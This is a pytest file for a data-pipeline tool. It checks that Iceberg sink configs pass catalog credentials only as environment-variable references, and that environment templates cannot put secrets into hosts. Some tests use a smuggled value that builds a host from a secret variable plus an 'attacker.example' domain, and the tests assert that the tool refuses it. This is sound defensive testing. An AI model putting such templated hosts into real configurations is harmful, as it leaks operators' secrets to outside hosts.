# Copyright 2025 Agentics Transformation Limited
# SPDX-License-Identifier: Apache-2.0

"""``sink.catalogAuth`` in the configs the two streaming runners derive.

Kafka Connect takes the auth properties under ``iceberg.catalog.``; embedded
Debezium Server takes them bare and the runner adds ``debezium.sink.iceberg.``.
Either way the secret is an ``env:<NAME>`` reference, never its value, and
never a KIP-887 ``${env:...}`` or Quarkus ``${...}`` expression. The embedded
runner starts the server with its own environment, so its preflight refuses a
run whose variable is unset or empty.
"""

from __future__ import annotations

import logging
import os
import subprocess
from pathlib import Path
from typing import Any, Dict, List, Optional

import pytest

from fluid_build.build_runners._deployment_host_policy import ALLOWLIST_ENV as HOST_ALLOWLIST
from fluid_build.build_runners.debezium.iceberg_sink import emit_debezium_iceberg_sink_config
from fluid_build.build_runners.kafka_connect.iceberg_sink import emit_iceberg_sink_config
from fluid_build.providers._iceberg_catalog import ResolvedIcebergCatalog
from fluid_build.providers._iceberg_catalog_auth import parse_catalog_auth
from fluid_build.secrets.policy import ALLOWLIST_ENV as SECRET_REF_ALLOWLIST

pytestmark = [pytest.mark.unit]


@pytest.fixture(autouse=True)
def _operator_allows_the_fixture_hosts(request, monkeypatch):
    """The operator pairs each fixture variable with each fixture host. Where a
    credential may go is pinned in test_iceberg_sink_catalog_destinations.py."""
    if "kafka_connect_mock" in request.fixturenames:
        # The mock may set the host list for its own server: extend it after.
        request.getfixturevalue("kafka_connect_mock")
    hosts = ("lakekeeper", "keycloak")
    names = ("LAKEKEEPER_CREDENTIAL", "UC_TOKEN")
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, ",".join(f"{n}@{h}" for n in names for h in hosts))
    current = [h for h in os.environ.get(HOST_ALLOWLIST, "").split(",") if h.strip()]
    monkeypatch.setenv(HOST_ALLOWLIST, ",".join([*current, *hosts]))


_KEYCLOAK = "https://keycloak:8443/realms/iceberg/protocol/openid-connect/token"
_SECRET_VALUE = "spark:2OR3eRvYfSZzzZ16MlPd95jhLnOaLM52"  # pragma: allowlist secret
_OAUTH2 = {
    "type": "oauth2",
    "credentialEnv": "LAKEKEEPER_CREDENTIAL",
    "oauth2ServerUri": _KEYCLOAK,
    "scope": "lakekeeper",
}
_BEARER = {"type": "bearer", "tokenEnv": "UC_TOKEN"}

_LAKEKEEPER = ResolvedIcebergCatalog(
    catalog_type="rest",
    warehouse="demo",
    fq_table="bronze.orders",
    uri="https://lakekeeper:8443/catalog",
    kind="lakekeeper",
)


def _auth(raw: Dict[str, Any]):
    auth, problems = parse_catalog_auth(raw)
    assert problems == []
    return auth


# ── emitters ────────────────────────────────────────────────────────────────


def test_kafka_connect_oauth2_properties_under_the_catalog_prefix():
    cfg = emit_iceberg_sink_config(
        _LAKEKEEPER, product_id="p", topics=["t"], catalog_auth=_auth(_OAUTH2)
    )
    assert cfg["iceberg.catalog.rest.auth.type"] == "oauth2"
    assert cfg["iceberg.catalog.credential"] == "env:LAKEKEEPER_CREDENTIAL"
    assert cfg["iceberg.catalog.oauth2-server-uri"] == _KEYCLOAK
    assert cfg["iceberg.catalog.scope"] == "lakekeeper"
    assert not any("${" in v for v in cfg.values())


def test_kafka_connect_bearer_properties():
    cfg = emit_iceberg_sink_config(
        _LAKEKEEPER, product_id="p", topics=["t"], catalog_auth=_auth(_BEARER)
    )
    assert cfg["iceberg.catalog.rest.auth.type"] == "oauth2"
    assert cfg["iceberg.catalog.token"] == "env:UC_TOKEN"
    assert "iceberg.catalog.credential" not in cfg
    assert "iceberg.catalog.scope" not in cfg


def test_kafka_connect_without_catalog_auth_is_unchanged():
    with_none = emit_iceberg_sink_config(_LAKEKEEPER, product_id="p", topics=["t"])
    assert not any(
        k.endswith((".credential", ".token", ".rest.auth.type", ".scope")) for k in with_none
    )


def test_debezium_properties_are_bare():
    cfg = emit_debezium_iceberg_sink_config(_LAKEKEEPER, catalog_auth=_auth(_OAUTH2))
    assert cfg["rest.auth.type"] == "oauth2"
    assert cfg["credential"] == "env:LAKEKEEPER_CREDENTIAL"
    assert cfg["oauth2-server-uri"] == _KEYCLOAK
    assert cfg["scope"] == "lakekeeper"
    assert not any(k.startswith(("iceberg.", "debezium.")) for k in cfg)
    bearer = emit_debezium_iceberg_sink_config(_LAKEKEEPER, catalog_auth=_auth(_BEARER))
    assert bearer["token"] == "env:UC_TOKEN"


def test_emitters_are_deterministic_with_auth():
    auth = _auth({**_OAUTH2, "audience": "lakekeeper"})
    assert emit_iceberg_sink_config(
        _LAKEKEEPER, product_id="p", topics=["t"], catalog_auth=auth
    ) == emit_iceberg_sink_config(_LAKEKEEPER, product_id="p", topics=["t"], catalog_auth=auth)
    assert emit_debezium_iceberg_sink_config(
        _LAKEKEEPER, catalog_auth=auth
    ) == emit_debezium_iceberg_sink_config(_LAKEKEEPER, catalog_auth=auth)


# ── Kafka Connect runner ────────────────────────────────────────────────────


def _kc_contract(
    catalog_auth: Optional[Dict[str, Any]], *, location: Optional[Dict[str, Any]] = None, **kc: Any
) -> Dict[str, Any]:
    sink: Dict[str, Any] = {"format": "iceberg"}
    if catalog_auth is not None:
        sink["catalogAuth"] = catalog_auth
    return {
        "fluidVersion": "0.7.6",
        "kind": "DataProduct",
        "id": "bronze.kc_auth",
        "name": "X",
        "metadata": {"layer": "Bronze", "owner": {"team": "dp", "email": "x@y.z"}},
        "builds": [
            {
                "id": "ingest",
                "pattern": "acquisition",
                "engine": "kafka-connect",
                "properties": {
                    "source": {
                        "kind": "postgres",
                        "connection": {"host": "db", "database": "x", "user": "u"},
                        "mode": "incremental_append",
                        "streams": ["public.orders"],
                    },
                    "sink": sink,
                    "kafka-connect": {
                        "deployment": {"server_url": "http://kafka-connect.test:8083"},
                        "connector_name": "src",
                        **kc,
                    },
                },
                "outputs": ["data"],
            }
        ],
        "exposes": [
            {
                "exposeId": "data",
                "kind": "table",
                "binding": {
                    "platform": "local",
                    "format": "iceberg",
                    "location": (
                        dict(location)
                        if location is not None
                        else {
                            "catalog": "lakekeeper",
                            "uri": "https://lakekeeper:8443/catalog",
                            "warehouse": "demo",
                            "database": "bronze",
                            "table": "orders",
                        }
                    ),
                },
                "contract": {"schema": []},
            }
        ],
    }


def test_kafka_connect_runner_pushes_env_references(
    kafka_connect_mock, tmp_path: Path, monkeypatch, caplog
):
    from fluid_build.build_runners.kafka_connect.runner import execute_kafka_connect_build

    # Set or not, the runner never reads the worker's variable: the config
    # carries the reference only.
    monkeypatch.setenv("LAKEKEEPER_CREDENTIAL", _SECRET_VALUE)
    contract = _kc_contract(dict(_OAUTH2))
    with caplog.at_level(logging.DEBUG):
        rc = execute_kafka_connect_build(contract["builds"][0], contract, tmp_path)
    assert rc == 0
    cfg = kafka_connect_mock.connectors["src-sink"]["config"]
    assert cfg["iceberg.catalog.credential"] == "env:LAKEKEEPER_CREDENTIAL"
    assert cfg["iceberg.catalog.rest.auth.type"] == "oauth2"
    assert cfg["iceberg.catalog.oauth2-server-uri"] == _KEYCLOAK
    assert cfg["iceberg.catalog.scope"] == "lakekeeper"
    assert _SECRET_VALUE not in repr(kafka_connect_mock.connectors)
    assert _SECRET_VALUE not in caplog.text


def test_kafka_connect_runner_needs_no_variable_in_its_own_environment(
    kafka_connect_mock, tmp_path: Path, monkeypatch
):
    from fluid_build.build_runners.kafka_connect.runner import execute_kafka_connect_build

    monkeypatch.delenv("UC_TOKEN", raising=False)
    contract = _kc_contract(dict(_BEARER))
    assert execute_kafka_connect_build(contract["builds"][0], contract, tmp_path) == 0
    cfg = kafka_connect_mock.connectors["src-sink"]["config"]
    assert cfg["iceberg.catalog.token"] == "env:UC_TOKEN"


def test_kafka_connect_runner_refuses_an_override_that_sets_auth(
    kafka_connect_mock, tmp_path: Path
):
    from fluid_build.build_runners.kafka_connect.runner import execute_kafka_connect_build

    contract = _kc_contract(
        dict(_OAUTH2), iceberg_catalog_overrides={"iceberg.catalog.token": "env:OTHER"}
    )
    assert execute_kafka_connect_build(contract["builds"][0], contract, tmp_path) == 1
    assert kafka_connect_mock.calls == []


# ── embedded Debezium Server runner ─────────────────────────────────────────


def _dbz_contract(
    catalog_auth: Optional[Dict[str, Any]],
    server_sink: Any = None,
    *,
    location: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    contract = _kc_contract(catalog_auth, location=location)
    contract["id"] = "bronze.dbz_auth"
    build = contract["builds"][0]
    build["engine"] = "debezium"
    props = build["properties"]
    del props["kafka-connect"]
    props["source"] = {
        "kind": "postgres",
        "connection": {"host": "db", "port": 5432, "database": "x", "user": "u"},
        "mode": "cdc",
        "streams": ["public.orders"],
    }
    props["debezium"] = {
        "deployment": {"mode": "embedded"},
        "server": {"sink": server_sink or {"type": "iceberg"}},
    }
    return contract


def _props_path(contract: Dict[str, Any], tmp_path: Path) -> Path:
    return tmp_path / ".fluid" / "debezium" / contract["id"] / "ingest" / "application.properties"


class _RecordingRun:
    """Stands in for ``subprocess.run`` of the Debezium Server binary."""

    def __init__(self) -> None:
        self.calls: List[Dict[str, Any]] = []

    def __call__(self, argv: List[str], **kwargs: Any) -> subprocess.CompletedProcess:
        self.calls.append({"argv": argv, **kwargs})
        return subprocess.CompletedProcess(argv, 0, stdout="", stderr="")


def _install_fake_server(monkeypatch) -> _RecordingRun:
    """Fake the Debezium Server binary and its start; returns the recorder."""
    from fluid_build.build_runners.debezium import runner as dbz_runner

    recorder = _RecordingRun()
    monkeypatch.setattr(dbz_runner, "resolve_server_binary", lambda _v: "/opt/dbz/run.sh")
    monkeypatch.setattr(dbz_runner.subprocess, "run", recorder)
    return recorder


@pytest.fixture
def fake_server(monkeypatch):
    return _install_fake_server(monkeypatch)


def test_embedded_writes_env_references_and_the_server_inherits_the_environment(
    tmp_path: Path, monkeypatch, fake_server, caplog
):
    from fluid_build.build_runners.debezium.runner import execute_debezium_build

    monkeypatch.setenv("LAKEKEEPER_CREDENTIAL", _SECRET_VALUE)
    contract = _dbz_contract(dict(_OAUTH2))
    with caplog.at_level(logging.DEBUG):
        rc = execute_debezium_build(contract["builds"][0], contract, tmp_path)
    assert rc == 0
    text = _props_path(contract, tmp_path).read_text()
    assert "debezium.sink.iceberg.rest.auth.type=oauth2" in text
    assert "debezium.sink.iceberg.credential=env:LAKEKEEPER_CREDENTIAL" in text
    assert f"debezium.sink.iceberg.oauth2-server-uri={_KEYCLOAK}" in text
    assert "debezium.sink.iceberg.scope=lakekeeper" in text
    assert _SECRET_VALUE not in text
    assert _SECRET_VALUE not in caplog.text
    # ``env=None``: the server process inherits this one's environment, where
    # Iceberg resolves env:LAKEKEEPER_CREDENTIAL (the source has no password
    # to add to it).
    assert len(fake_server.calls) == 1
    assert fake_server.calls[0].get("env") is None


@pytest.mark.parametrize("value", [None, ""], ids=["unset", "empty"])
def test_embedded_preflight_refuses_an_unset_variable(
    tmp_path: Path, monkeypatch, fake_server, value
):
    from fluid_build.api.runner import RunState
    from fluid_build.build_runners._acquisition_common import build_acquisition_run_context
    from fluid_build.build_runners.debezium.runner import DebeziumRunner

    if value is None:
        monkeypatch.delenv("UC_TOKEN", raising=False)
    else:
        monkeypatch.setenv("UC_TOKEN", value)
    contract = _dbz_contract(dict(_BEARER))
    ctx = build_acquisition_run_context(contract["builds"][0], contract, tmp_path)
    result = DebeziumRunner().run(ctx)
    assert result.state == RunState.FAILED
    assert "iceberg sink preflight failed:" in (result.error or "")
    assert "sink.catalogAuth.tokenEnv names UC_TOKEN" in result.error
    assert "unset or empty" in result.error
    assert not _props_path(contract, tmp_path).exists()
    assert fake_server.calls == []


def test_embedded_preflight_never_reports_the_value(tmp_path: Path, monkeypatch, fake_server):
    """A set variable passes; its value appears nowhere in the run result."""
    from fluid_build.build_runners._acquisition_common import build_acquisition_run_context
    from fluid_build.build_runners.debezium.runner import DebeziumRunner

    monkeypatch.setenv("UC_TOKEN", "eyJhbGciOiJIUzI1NiJ9.e30.sig")  # pragma: allowlist secret
    contract = _dbz_contract(dict(_BEARER))
    ctx = build_acquisition_run_context(contract["builds"][0], contract, tmp_path)
    result = DebeziumRunner().run(ctx)
    assert result.error is None
    assert "eyJhbGciOiJIUzI1NiJ9" not in repr(result)
    text = _props_path(contract, tmp_path).read_text()
    assert "debezium.sink.iceberg.token=env:UC_TOKEN" in text


def test_embedded_handwritten_config_with_catalog_auth_is_refused(
    tmp_path: Path, monkeypatch, fake_server
):
    from fluid_build.build_runners.debezium.runner import execute_debezium_build

    monkeypatch.setenv("LAKEKEEPER_CREDENTIAL", _SECRET_VALUE)
    contract = _dbz_contract(
        dict(_OAUTH2), server_sink={"type": "iceberg", "config": {"type": "rest"}}
    )
    assert execute_debezium_build(contract["builds"][0], contract, tmp_path) == 1
    assert not _props_path(contract, tmp_path).exists()
    assert fake_server.calls == []


# ── {{ env.* }} in an address: the operator's environment never picks the host ──
#
# The acquisition dispatcher renders ``{{ env.* }}`` from the operator's environment before
# a runner starts. In the host of a catalog URI that sent the variable's value, in the host
# name, to whoever owns the domain the contract names. A credential-shaped variable never
# renders into a URL or a host field; any other renders into a URL's authority or a host
# field only for the host the operator paired it with (``NAME@host``).

_PROBE = "synthvalue123"


def _dispatch(contract: Dict[str, Any], tmp_path: Path) -> int:
    from fluid_build.build_runners.base import _execute_acquisition_build

    return _execute_acquisition_build(contract["builds"][0], contract, tmp_path, dry_run=False)


@pytest.fixture(params=["kafka-connect", "debezium"])
def sink_engine(request, tmp_path: Path, monkeypatch):
    """One acquisition engine with its server faked, and a way to build its contract and to
    see what it would start: ``(contract_for(location), pushed())``."""
    if request.param == "kafka-connect":
        mock = request.getfixturevalue("kafka_connect_mock")

        def contract_for(location: Dict[str, Any], **_: Any) -> Dict[str, Any]:
            return _kc_contract(None, location=location)

        return contract_for, lambda: repr(mock.connectors)
    recorder = _install_fake_server(monkeypatch)
    paths: List[Path] = []

    def dbz_contract_for(location: Dict[str, Any], **_: Any) -> Dict[str, Any]:
        contract = _dbz_contract(None, location=location)
        paths.append(_props_path(contract, tmp_path))
        return contract

    def pushed() -> str:
        started = repr(recorder.calls)
        written = "".join(p.read_text() for p in paths if p.exists())
        return started + written

    return dbz_contract_for, pushed


def _catalog(uri: str) -> Dict[str, Any]:
    return {
        "catalog": "lakekeeper",
        "uri": uri,
        "warehouse": "demo",
        "database": "bronze",
        "table": "orders",
    }


def test_a_credential_shaped_variable_never_renders_into_a_catalog_host(
    sink_engine, tmp_path: Path, monkeypatch, capsys, caplog
):
    contract_for, pushed = sink_engine
    monkeypatch.setenv("OPERATOR_SYNTH_SECRET", _PROBE)
    contract = contract_for(
        _catalog("https://{{ env.OPERATOR_SYNTH_SECRET }}.attacker.example/catalog")
    )

    with caplog.at_level(logging.DEBUG):
        rc = _dispatch(contract, tmp_path)

    shown = capsys.readouterr()
    assert rc == 1
    assert _PROBE not in pushed() and "attacker.example" not in pushed()
    assert "OPERATOR_SYNTH_SECRET" in shown.out + shown.err, "the refusal names the variable"
    assert "location.uri" in shown.out + shown.err, "and the field"
    assert _PROBE not in shown.out + shown.err + caplog.text, "never the rendered value"


def test_a_variable_that_makes_a_host_renders_only_when_the_operator_paired_it(
    sink_engine, tmp_path: Path, monkeypatch, capsys, caplog
):
    contract_for, pushed = sink_engine
    monkeypatch.setenv("CATALOG_HOST", "lake")
    contract = contract_for(_catalog("https://{{ env.CATALOG_HOST }}keeper:8443/catalog"))

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "CATALOG_HOST@elsewhere")
    with caplog.at_level(logging.DEBUG):
        assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert "lakekeeper" not in pushed()
    assert "CATALOG_HOST" in shown.out + shown.err
    assert "FLUID_ACQUISITION_SECRET_REF_ALLOWLIST" in shown.out + shown.err
    assert "lakekeeper" not in shown.out + shown.err + caplog.text, "never the rendered host"

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "CATALOG_HOST@lakekeeper")
    assert _dispatch(contract, tmp_path) == 0
    assert "https://lakekeeper:8443/catalog" in pushed()


def test_a_paired_variable_with_no_host_is_paired_with_every_host(
    sink_engine, tmp_path: Path, monkeypatch
):
    contract_for, pushed = sink_engine
    monkeypatch.setenv("CATALOG_HOST", "lake")
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "CATALOG_HOST")
    contract = contract_for(_catalog("https://{{ env.CATALOG_HOST }}keeper:8443/catalog"))
    assert _dispatch(contract, tmp_path) == 0
    assert "https://lakekeeper:8443/catalog" in pushed()


def test_a_variable_that_is_the_whole_catalog_host_needs_no_pairing(
    sink_engine, tmp_path: Path, monkeypatch
):
    """The operator's variable makes the address; the contract only says which one."""
    contract_for, pushed = sink_engine
    monkeypatch.setenv("CATALOG_HOST", "lakekeeper:8443")
    monkeypatch.delenv(SECRET_REF_ALLOWLIST, raising=False)
    contract = contract_for(_catalog("https://{{ env.CATALOG_HOST }}/catalog"))
    assert _dispatch(contract, tmp_path) == 0
    assert "https://lakekeeper:8443/catalog" in pushed()


def test_a_template_in_the_path_of_a_url_needs_no_pairing_but_a_secret_one_is_refused(
    sink_engine, tmp_path: Path, monkeypatch, capsys
):
    contract_for, pushed = sink_engine
    monkeypatch.setenv("CATALOG_TENANT", "acme")
    contract = contract_for(_catalog("https://lakekeeper:8443/{{ env.CATALOG_TENANT }}/catalog"))
    assert _dispatch(contract, tmp_path) == 0
    assert "https://lakekeeper:8443/acme/catalog" in pushed()

    monkeypatch.setenv("TENANT_SECRET", _PROBE)
    leaky = contract_for(_catalog("https://lakekeeper:8443/{{ env.TENANT_SECRET }}/catalog"))
    capsys.readouterr()
    assert _dispatch(leaky, tmp_path) == 1
    assert _PROBE not in capsys.readouterr().out


def test_an_unset_variable_in_a_catalog_host_is_refused_by_name(
    sink_engine, tmp_path: Path, monkeypatch, capsys
):
    contract_for, pushed = sink_engine
    monkeypatch.delenv("CATALOG_HOST", raising=False)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "CATALOG_HOST")
    contract = contract_for(_catalog("https://{{ env.CATALOG_HOST }}/catalog"))
    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert "CATALOG_HOST" in shown.out + shown.err and "not set or empty" in shown.out + shown.err
    assert pushed() in ("{}", "[]", "")


def _dispatch_as_run_builds_does(contract: Dict[str, Any], tmp_path: Path, *, plan: bool) -> int:
    """Through the arguments ``run_builds_from_args`` passes: the contract as written beside the
    one it runs. A plan's contract is rendered before it gets there (``plan=True``)."""
    import copy

    from fluid_build._contract_loader import resolve_contract_env_templates
    from fluid_build.build_runners.base import _execute_acquisition_build

    running = resolve_contract_env_templates(copy.deepcopy(contract)) if plan else contract
    return _execute_acquisition_build(
        running["builds"][0], running, tmp_path, dry_run=False, as_written=contract
    )


@pytest.mark.parametrize("plan", [False, True], ids=["yaml-contract", "plan-contract"])
def test_a_host_in_the_build_is_refused_on_the_path_apply_runs(
    sink_engine, tmp_path: Path, monkeypatch, capsys, caplog, plan
):
    """``run_builds_from_args`` always passes the contract as written, so the build's own fields
    (``source.connection.host``, the sink) are judged there too: the check once looked at them
    only when nothing was passed as written, which is never."""
    contract_for, pushed = sink_engine
    monkeypatch.setenv("OPERATOR_SYNTH_SECRET", _PROBE)
    contract = contract_for(_catalog("https://lakekeeper:8443/catalog"))
    connection = contract["builds"][0]["properties"]["source"]["connection"]
    connection["host"] = "{{ env.OPERATOR_SYNTH_SECRET }}.attacker.example"

    with caplog.at_level(logging.DEBUG):
        rc = _dispatch_as_run_builds_does(contract, tmp_path, plan=plan)

    shown = capsys.readouterr()
    everything = shown.out + shown.err + caplog.text
    assert rc == 1
    assert "OPERATOR_SYNTH_SECRET" in everything and "source.connection.host" in everything
    assert _PROBE not in everything and _PROBE not in pushed()


@pytest.mark.parametrize("plan", [False, True], ids=["yaml-contract", "plan-contract"])
def test_an_unpaired_host_variable_in_the_build_is_refused_on_the_path_apply_runs(
    sink_engine, tmp_path: Path, monkeypatch, capsys, plan
):
    contract_for, pushed = sink_engine
    monkeypatch.setenv("SRC_PREFIX", "internal")
    monkeypatch.delenv(SECRET_REF_ALLOWLIST, raising=False)
    contract = contract_for(_catalog("https://lakekeeper:8443/catalog"))
    connection = contract["builds"][0]["properties"]["source"]["connection"]
    connection["host"] = "{{ env.SRC_PREFIX }}.db.example"

    assert _dispatch_as_run_builds_does(contract, tmp_path, plan=plan) == 1
    shown = capsys.readouterr()
    assert "SRC_PREFIX" in shown.out + shown.err
    assert "internal" not in shown.out + shown.err, "never the rendered host"
